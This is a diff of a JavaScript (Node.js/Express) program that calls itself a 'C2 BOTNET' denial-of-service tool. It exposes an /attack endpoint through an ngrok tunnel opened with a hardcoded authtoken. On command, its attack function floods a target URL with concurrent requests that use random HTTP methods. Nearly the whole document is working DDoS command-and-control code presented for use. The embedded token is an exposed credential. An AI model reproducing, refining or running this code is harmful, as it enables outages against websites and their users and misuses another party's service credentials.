@@ -6,70 +6,49 @@ const app = express();
 const bodyParser = require('body-parser');
 const crypto = require('crypto');
 
-// Middleware
 app.use(bodyParser.json());
-app.use((req, res, next) => {
-  res.header('Access-Control-Allow-Origin', '*');
-  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
-  next();
-});
-
-// Global variables
 let C = false;
 let targetInfo = {};
-let currentPort = process.env.PORT || Math.floor(Math.random() * (60000 - 3000 + 1)) + 3000;
-let ngrokUrl = null;
+let currentPort = Math.floor(Math.random() * (60000 - 3000 + 1)) + 3000;
 
 const L = () => {
   console.log(`
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
+  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
-⠀⠀⠀⠀⠀⠀⠈⠀⠄⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈ [ # ] Author : Dizflyze
-⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐ [ # ] Denial Of Service
-⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] Version : v1.3.2
-⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] Update : 23 January
-⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
-⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
+⠀⠀⠀⠀⠀⠀ ⠀ ⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿  [ # ] Dizflyze
+⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿  [ # ] DDOS
+⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀ ⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] 3.1.8
+⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋   ⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 26-MEI
+⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀ ⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
+⠙⢹⣿⣿⣿⠿⠋⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
 ⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
   `.cyan);
   console.log(`C2 BOTNET VERSION\n`.yellow);
 };
 
-const startNgrok = async () => {
+const N = async () => {
   try {
-    await ngrok.kill();
     await ngrok.authtoken('2xclrXeyimoudAtLmDQu7DibbSJ_42dYjd7bccEoCS23svLnA');
-    
-    ngrokUrl = await ngrok.connect({
+    const url = await ngrok.connect({
       proto: 'http',
       addr: currentPort,
-      region: 'ap',
-      onStatusChange: status => {
-        if (status === 'closed') {
-          console.log('Ngrok connection closed, attempting to reconnect...'.yellow);
-          setTimeout(startNgrok, 5000);
-        }
-      }
+      region: 'ap'
     });
     
-    console.log(`\n${'[ API C2 ] :'.bold} ${ngrokUrl.underline}`);
+    console.log(`\n${'[ API C2 ] :'.bold} ${url.underline}`);
     console.log(`${'[ INFO ] : [ MENUNGGU ]'.yellow}\n`);
-    return ngrokUrl;
+    return url;
   } catch (e) {
     console.log(`\n${'×'.red} ${'[ NGROK ERROR ] :'.bold} ${e.message}`);
-    console.log('Attempting to restart ngrok in 5 seconds...'.yellow);
-    setTimeout(startNgrok, 5000);
-    return null;
+    process.exit(1);
   }
 };
 
 const A = async (target, duration) => {
   const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'];
   const userAgents = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-    'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36'
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
   ];
 
   console.log(`\n${'⚡'.yellow} ${'[ ATTACK ] :'.bold} ${target.underline}`);
@@ -91,8 +70,7 @@ const A = async (target, duration) => {
               'Accept-Language': 'en-US,en;q=0.9',
               'Cache-Control': 'no-cache'
             },
-            timeout: 2500,
-            validateStatus: false
+            timeout: 2500
           });
         } catch (e) {}
       }
@@ -102,7 +80,6 @@ const A = async (target, duration) => {
 
   await Promise.all(AP);
   console.log(`\n${'✓'.green} ${'[ SUCCESS ]'.bold}\n`);
-  C = false;
 };
 
 app.post('/attack', async (req, res) => {
@@ -130,28 +107,8 @@ app.get('/info', async (req, res) => {
   }
 });
 
-const startServer = async () => {
-  try {
-    L();
-    app.listen(currentPort, async () => {
-      console.log(`${'[ RUNING ] :'.bold} ${currentPort.toString().yellow}`);
-      await startNgrok();
-    });
-  } catch (error) {
-    console.log(`\n${'×'.red} ${'[ SERVER ERROR ] :'.bold} ${error.message}`);
-    process.exit(1);
-  }
-};
-
-process.on('SIGINT', async () => {
-  try {
-    await ngrok.kill();
-    console.log('\nServer stopped'.yellow);
-    process.exit(0);
-  } catch (error) {
-    console.log('Error stopping server:'.red, error);
-    process.exit(1);
-  }
+L();
+app.listen(currentPort, () => {
+  console.log(`${'[ RUNING ] :'.bold} ${currentPort.toString().yellow}`);
+  N();
 });
-
-startServer();
